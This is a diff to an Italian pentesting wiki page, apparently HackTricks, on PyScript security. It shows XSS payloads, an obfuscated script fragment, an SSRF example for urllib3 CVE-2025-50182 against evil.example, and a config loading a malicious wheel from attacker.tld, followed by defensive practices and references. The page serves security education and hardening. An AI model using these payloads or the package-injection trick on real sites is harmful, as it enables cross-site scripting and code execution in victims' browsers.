@@ -57,7 +57,7 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
-### Cross Site Scripting (Python offuscato)
+### Cross Site Scripting (Python Offuscato)
 
 Codice:
 ```python
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Codice:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,7 +140,7 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Nuove vulnerabilità e tecniche (2023-2025)
+
+### Server-Side Request Forgery tramite redirect non controllati (CVE-2025-50182)
+
+`urllib3 < 2.5.0` ignora i parametri `redirect` e `retries` quando viene eseguito **all'interno del runtime Pyodide** che viene fornito con PyScript. Quando un attaccante può influenzare gli URL di destinazione, può forzare il codice Python a seguire redirect cross-domain anche quando lo sviluppatore li ha esplicitamente disabilitati ‑ bypassando effettivamente la logica anti-SSRF.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+Patched in `urllib3 2.5.0` – aggiorna il pacchetto nella tua immagine PyScript o fissa una versione sicura in `packages = ["urllib3>=2.5.0"]`. Vedi l'entry CVE ufficiale per i dettagli.
+
+### Caricamento di pacchetti arbitrari e attacchi alla supply chain
+
+Poiché PyScript consente URL arbitrari nella lista `packages`, un attore malintenzionato che può modificare o iniettare configurazioni può eseguire **Python completamente arbitrario** nel browser della vittima:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Solo le ruote pure-Python sono necessarie – non è necessario alcun passaggio di compilazione WebAssembly.* Assicurati che la configurazione non sia controllata dall'utente e ospita ruote fidate sul tuo dominio con HTTPS e hash SRI.
+
+### Modifiche alla sanificazione dell'output (2023+)
+
+* `print()` inietta ancora HTML grezzo ed è quindi soggetto a XSS (esempi sopra).
+* Il nuovo helper `display()` **escapa l'HTML per impostazione predefinita** – il markup grezzo deve essere racchiuso in `pyscript.HTML()`.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+Questo comportamento è stato introdotto nel 2023 ed è documentato nella guida ufficiale ai Built-ins. Fai affidamento su `display()` per input non attendibili ed evita di chiamare `print()` direttamente.
+
+---
+
+## Pratiche Difensive Migliori
+
+* **Mantieni i pacchetti aggiornati** – aggiorna a `urllib3 >= 2.5.0` e ricostruisci regolarmente i pacchetti che vengono forniti con il sito.
+* **Limita le fonti dei pacchetti** – fai riferimento solo ai nomi di PyPI o agli URL della stessa origine, idealmente protetti con Sub-resource Integrity (SRI).
+* **Rafforza la Content Security Policy** – vieta JavaScript inline (`script-src 'self' 'sha256-…'`) in modo che i blocchi `<script>` iniettati non possano essere eseguiti.
+* **Vieta i tag `<py-script>` / `<script type="py">` forniti dall'utente** – sanitizza l'HTML sul server prima di restituirlo ad altri utenti.
+* **Isola i worker** – se non hai bisogno di accesso sincrono al DOM dai worker, abilita il flag `sync_main_only` per evitare i requisiti dell'intestazione `SharedArrayBuffer`.
+
+## Riferimenti
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [Documentazione Built-ins di PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
